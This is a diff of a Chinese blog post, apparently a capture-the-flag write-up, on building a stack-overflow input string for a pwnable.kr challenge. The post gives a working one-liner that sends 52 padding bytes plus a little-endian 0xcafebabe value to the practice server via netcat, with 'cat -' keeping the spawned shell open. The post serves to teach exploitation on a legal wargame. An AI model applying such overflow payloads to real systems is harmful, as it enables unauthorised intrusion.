@@ -1,18 +1,18 @@
 ---
-layout: post
-title: 构造缓冲区溢出字符串的一种方式
 date: 2015-09-14
-categories: 
-- 技术
 tags: 
 - pwn
 author: tiankai
+layout: post
+title: 构造缓冲区溢出字符串的一种方式
 excerpt: stack overflow 字符串 
+categories: 
+- 技术
 ---
 
-<div id="outline-container-sec-1" class="outline-2">
-<h2 id="sec-1">背景</h2>
-<div class="outline-text-2" id="text-1">
+<div id="outline-container-org4cb4e56" class="outline-2">
+<h2 id="org4cb4e56">背景</h2>
+<div class="outline-text-2" id="text-org4cb4e56">
 <p>
 最近在做<a href="http://pwnable.kr/">http://pwnable.kr/</a> 上面的溢出题目碰到了几个使用字符串然后进行溢出的题目,一开始遇到的时候,
 知道输入的字符串是什么,到时就是不知道怎么构造,后来看到网上的分析才知道,原来字符串的输入方式是很有讲究的,
@@ -21,16 +21,15 @@ excerpt: stack overflow 字符串
 </div>
 </div>
 
-<div id="outline-container-sec-2" class="outline-2">
-<h2 id="sec-2">通过python构造溢出性字符串</h2>
-<div class="outline-text-2" id="text-2">
+<div id="outline-container-org42f9a62" class="outline-2">
+<h2 id="org42f9a62">通过python构造溢出性字符串</h2>
+<div class="outline-text-2" id="text-org42f9a62">
 <p>
 通过逆向分析,现在已经基本的知道了我们需要构造的溢出字符串的类型,就是前面52个填充型的字符串,然后后面跟着
 "cafebabe"的小端写法,我们要发给的远程的计算机,通过nc进行连接:
 </p>
 <div class="org-src-container">
-
-<pre class="src src-bash">nc pwnable.kr 9000
+<pre class="src src-bash">nc pwnable.kr <span style="color: #a45bad;">9000</span>
 </pre>
 </div>
 <p>
@@ -67,29 +66,24 @@ python -c 'print "A"*52 + "\xbe\xba\xfe\xca"' &gt; nc pwnable.kr 9000
 </div>
 </div>
 
-<div id="outline-container-sec-3" class="outline-2">
-<h2 id="sec-3">正确的输入方式</h2>
-<div class="outline-text-2" id="text-3">
+<div id="outline-container-org141723c" class="outline-2">
+<h2 id="org141723c">正确的输入方式</h2>
+<div class="outline-text-2" id="text-org141723c">
 <p>
 通过查找资料,发现正确的查找方式如下所示;
 </p>
 <div class="org-src-container">
-
-<pre class="src src-bash">(python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000
+<pre class="src src-bash"><span style="color: #4f97d7;">(</span>python -c <span style="color: #2d9574;">'print "A" * 52 + "\xbe\xba\xfe\xca"'</span>; cat -<span style="color: #4f97d7;">)</span> | nc pwnable.kr <span style="color: #a45bad;">9000</span>
 </pre>
 </div>
 <p>
 其中使用了4条命令;
 </p>
 <ol class="org-ol">
-<li>(python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"' :打印字符串
-</li>
-<li>cat - :输出stdin中的数据
-</li>
-<li>| :管道,上一个的输出作为下一个的输入
-</li>
-<li>nc pwnable.kr 9000 :和远程服务器进行通信.
-</li>
+<li>(python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"' :打印字符串</li>
+<li>cat - :输出stdin中的数据</li>
+<li>| :管道,上一个的输出作为下一个的输入</li>
+<li>nc pwnable.kr 9000 :和远程服务器进行通信.</li>
 </ol>
 <p>
 通过上面的命令就可以
